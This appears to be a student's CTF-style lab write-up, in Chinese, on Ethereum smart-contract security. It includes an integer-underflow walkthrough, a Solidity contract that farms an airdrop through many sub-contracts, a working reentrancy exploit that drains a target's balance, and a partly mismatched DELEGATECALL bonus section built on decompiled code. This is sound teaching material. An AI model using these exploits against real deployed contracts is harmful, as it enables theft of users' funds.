# lab-04: 智能合约安全基础



## 1. 发送交易



Transaction Hash: 0x7533e536857e50307733cca968620598bf216b137a07642a590413a6365db2a8

<img src="https://bu.dusays.com/2024/12/09/6756b0ee1a5be.png" alt="0bc53e209e5a3ff62833dca1738e6b8" style="zoom: 67%;" />



<img src="https://bu.dusays.com/2024/12/09/6756b0e9a9488.png" alt="fffb6463b68bd6dd22a438b2fae8304"  />

​	

## 2. 以太坊智能合约基础 (20 pts)



Remix VM 环境：

![image-20241209172006050](https://bu.dusays.com/2024/12/09/6756b64540b4c.png)



链上环境：

![image-20241209172500931](https://bu.dusays.com/2024/12/09/6756b76bc4c25.png)

 Contract Address： 0xACEd6a97C92554E6416bE52143071a50cA965655





## 整型溢出漏洞



观察代码，发现在`transfer`函数中存在整型下溢漏洞。uint256为无符号整数，不管怎样`balances[msg.sender] - _value`都是大于等于 0 的，并且当 `_value`超过`balance`后余额变为很大的数。因此本题攻击思路就是 init 之后转账一个稍大的数再调用`win`函数

```solidity
   function transfer(address _to, uint256 _value) public returns (bool) {
        require(balances[msg.sender] - _value >= 0);
        balances[msg.sender] -= _value;
        balances[_to] += _value;
        return true;
    }
```

### 本地测试：

![image-20241209224555840](https://bu.dusays.com/2024/12/09/67570782e5ad6.png)

### 链上攻击：

![image-20241209230220994](https://bu.dusays.com/2024/12/09/67570782d5c8c.png)

![image-20241209230431487](https://bu.dusays.com/2024/12/09/67570782ea761.png)

flag:ssec2024{W3Lc0mE_70_e7H_cOn7R4C7_s3CUrITY|293625f8}



## 薅羊毛攻击

​	如题，学习一下语法多开几个账户薅羊毛即可。



​	攻击思路如下：

1. 部署 `AttackAirDrop` 合约，传入目标合约地址
2. 调用 `attack()` 函数发起攻击
3. 攻击合约会自动完成以下流程：
   - 创建多个 `Collector` 合约
   - 每个 `Collector` 领取空投
   - 将代币汇总到攻击合约
   - 触发 `getFlag()`



```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IAirDrop {
    function profit() external;
    function transfer(address to, uint256 amount) external returns (bool);
    function getFlag() external;
}

contract AttackAirDrop {
    IAirDrop public target;
    address public owner;
    
    constructor(address _target) {
        target = IAirDrop(_target);
        owner = msg.sender;
    }
    
    // 创建多个子合约并领取空投
    function attack() external {
        for(uint i = 0; i < 26; i++) {
            Collector collector = new Collector(address(target));
            collector.collect();
            collector.transferBack();
        }
        
        target.getFlag();
    }
    
    function onERC20Received(uint256 amount) external {
        target.transfer(owner, amount);
    }
}

// 用于领取空投的子合约
contract Collector {
    IAirDrop public targetAirdrop;
    address public attackContract;
    
    constructor(address _target) {
        targetAirdrop = IAirDrop(_target);
        attackContract = msg.sender;
    }
    
    // 领取空投
    function collect() external {
        targetAirdrop.profit();
    }
    
    // 将代币转回给攻击合约
    function transferBack() external {
        require(msg.sender == attackContract, "Only attack contract can call");
        targetAirdrop.transfer(attackContract, 20);
    }
}
```



![image-20241210025231471](https://bu.dusays.com/2024/12/10/67573c6d8d8fa.png)

flag: ssec2024{nOw_YoU_KnOw_hoW_7O_A1RDrOP_HuNTIn9|db3129cf}

## 重入攻击

攻击思路如下：

1. 攻击合约先调用目标合约的 donate 函数,存入一定数量的以太币(如0.001 ether)。这是为了让攻击合约在目标合约中有初始余额。

2. 攻击合约再调用目标合约的 withdraw 函数,传入的提款金额为刚才存入的0.001 ether。

3. 目标合约会先检查余额是否足够,此时攻击合约是有0.001 ether余额的,所以检查通过。

4. 接下来目标合约直接通过 call 把 0.001 ether 发送给攻击合约。

5. 由于攻击合约实现了 fallback/receive 函数,在收到目标合约的转账时,fallback 会被触发。在 fallback 中,我们再次调用目标合约的 withdraw。

6. 这时候重入发生了。目标合约的 balances 变量还没来得及减去 0.001 ether,又进入了 withdraw。于是重复步骤3-5,直至目标合约的余额被取光。



exp：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.7.0;

interface IReentrance {
    function donate(address _to) external payable;
    function withdraw(uint _amount) external;
}

contract ReentranceExploit {
    IReentrance public target;
    uint targetBalance;

    constructor(address _target) {
        target = IReentrance(_target);
    }

    function attack() external payable {
        target.donate{value: 0.001 ether}(address(this));
        emit Log("Attacked contract initial balance:", address(this).balance);
        targetBalance = address(target).balance;
        target.withdraw(0.001 ether);
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {
        uint targetBalanceRemaining = address(target).balance;
        emit Log("Attacked contract balance:", address(target).balance);
        if(targetBalanceRemaining >= 0.001 ether) {
            target.withdraw(0.001 ether);
        }
    }

    event Log(string message);
    event Log(string message, uint value);
}


```



![image-20241210153325270](C:\Users\11922\AppData\Roaming\Typora\typora-user-images\image-20241210153325270.png)

Here is your flag: ssec2024{R3-EnTR4Ncy_1s_VErY_d4NG3rOUs|81e1da2f}



## bonus

`DELEGATECALL` 是以太坊虚拟机（EVM）中的一个重要操作码，用于在合约间调用函数时保留调用者的上下文（如存储、余额等）。与普通的 `CALL` 不同，`DELEGATECALL` 会在调用方的上下文中执行目标合约的代码，这意味着目标合约可以修改调用合约的存储。



通过反编译工具，我们获得了合约的部分字节码。重点关注以下部分：

- **`DELEGATECALL` 的位置：**
  - 地址 `0x1e1`: `DELEGATECALL`
  - 地址 `0x2d3`: `DELEGATECALL`

```solidity
// Decompiled by library.dedaub.com
// 2024.12.13 02:51 UTC
// Compiled using the solidity compiler version 0.7.6


// Data structures and variables inferred from the use of storage instructions
mapping (address => uint256) _balances; // STORAGE[0x0]



function withdraw(uint256 _amount) public nonPayable {  find similar
    require(msg.data.length - 4 >= 32);
    if (_balances[msg.sender] >= _amount) {
        v0,  v1 = msg.sender.call().value(_amount).gas(msg.gas);
        if (RETURNDATASIZE() != 0) {
            v2 = new bytes[](RETURNDATASIZE());
            v1 = v2.data;
            RETURNDATACOPY(v1, 0, RETURNDATASIZE());
        }
        _balances[msg.sender] = _balances[msg.sender] - _amount;
    }
}

function receive() public payable {  find similar
}

function isSolved() public nonPayable {  find similar
    return this.balance == 0;
}

function balanceOf(address account) public nonPayable {  find similar
    require(msg.data.length - 4 >= 32);
    return _balances[account];
}

function donate(address to) public payable {  find similar
    require(msg.data.length - 4 >= 32);
    _balances[to] = _balances[to] + msg.value;
}

function balances(address varg0) public nonPayable {  find similar
    require(msg.data.length - 4 >= 32);
    return _balances[varg0];
}

// Note: The function selector is not present in the original solidity code.
// However, we display it for the sake of completeness.

function __function_selector__( function_selector) public payable { 
    MEM[64] = 128;
    if (msg.data.length < 4) {
        require(!msg.data.length);
        receive();
    } else if (0x362a95 == function_selector >> 224) {
        donate(address);
    } else if (0x27e235e3 == function_selector >> 224) {
        balances(address);
    } else if (0x2e1a7d4d == function_selector >> 224) {
        withdraw(uint256);
    } else if (0x64d98f6e == function_selector >> 224) {
        isSolved();
    } else {
        require(0x70a08231 == function_selector >> 224);
        balanceOf(address);
    }
}
```



- **函数选择器（Function Selectors）：**
  - `0x27d6974f`
  - `0x3dc79422`
  - `0x5bda8fa4`
  - `0x8da5cb5b`
  - `0xf1e02620`
  - `0xf9633930`

这些选择器代表合约中可调用的不同函数。攻击者可以通过构造特定的函数调用，触发 `DELEGATECALL`，并执行自定义的恶意代码。
